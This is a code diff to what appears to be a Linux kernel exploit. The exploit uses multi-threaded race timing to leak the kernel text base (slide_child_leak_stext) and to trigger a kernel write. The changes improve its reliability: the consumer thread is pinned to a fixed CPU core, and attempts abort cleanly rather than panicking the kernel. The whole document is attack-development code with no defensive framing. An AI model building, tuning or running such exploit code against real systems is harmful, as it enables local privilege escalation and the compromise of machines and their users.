@@ -53,6 +53,7 @@ static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
+static atomic_int slide_consumer_pin_failed;
 static atomic_int slide_stack_write_window;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static atomic_uint_fast64_t slide_pselect_started_ns;
@@ -889,6 +890,7 @@ static void slide_reset_consume_state(void) {
   atomic_store(&slide_consume_last_sched_ret, -1);
   atomic_store(&slide_consume_last_sched_errno, 0);
   atomic_store(&slide_stack_write_window, 0);
+  atomic_store(&slide_consumer_pin_failed, 0);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   atomic_store(&slide_pselect_started_ns, 0);
 #endif
@@ -1481,7 +1483,16 @@ static int slide_wait_for_pselect_blocked(int tid, size_t timeout_usec,
 
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
-  pin_to_core(CONSUMER_CORE);
+  if (!pin_to_core_strict(CONSUMER_CORE)) {
+    /* Never run the consumption loop unpinned: the kernel-side window
+     * becomes scheduler mercy and panics roughly half the time. Abort
+     * the route cleanly; the orchestrator fails the attempt. */
+    pr_error("slide consumer pin failed core=%d; aborting route cleanly\n",
+             (int)CONSUMER_CORE);
+    atomic_store(&slide_consumer_pin_failed, 1);
+    atomic_store(&slide_consumer_ready, 1);
+    return NULL;
+  }
   atomic_store(&slide_consumer_ready, 1);
   int *errno_ptr = &errno;
 
@@ -1787,6 +1798,11 @@ uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
+  if (!rmg_pin_gate_ready()) {
+    pr_error("slide leak pin gate: no legal perf-core consumer placement; "
+             "failing cleanly\n");
+    return 0;
+  }
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
@@ -1794,6 +1810,10 @@ uint64_t slide_child_leak_stext(void) {
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
          !atomic_load(&slide_consumer_ready)) {
+    if (atomic_load(&slide_consumer_pin_failed)) {
+      pr_error("slide leak aborted: consumer pin failed\n");
+      return 0;
+    }
     usleep(1000);
   }
   if (SLIDE_REQUEUE_ARM_USEC) {
@@ -1839,6 +1859,11 @@ static int slide_child_trigger_write(void) {
   pthread_t owner;
   pthread_t consumer;
   int ready_polls = 0;
+  if (!rmg_pin_gate_ready()) {
+    pr_error("slide write pin gate: no legal perf-core consumer placement; "
+             "failing attempt cleanly\n");
+    return 0;
+  }
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
@@ -1846,6 +1871,10 @@ static int slide_child_trigger_write(void) {
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
          !atomic_load(&slide_consumer_ready)) {
+    if (atomic_load(&slide_consumer_pin_failed)) {
+      pr_error("slide write aborted: consumer pin failed\n");
+      return 0;
+    }
     usleep(1000);
     /* Bound the ready-sync: a thread that never arms (scheduler
      * starvation, cpuset surprise) must fail the attempt, not wedge
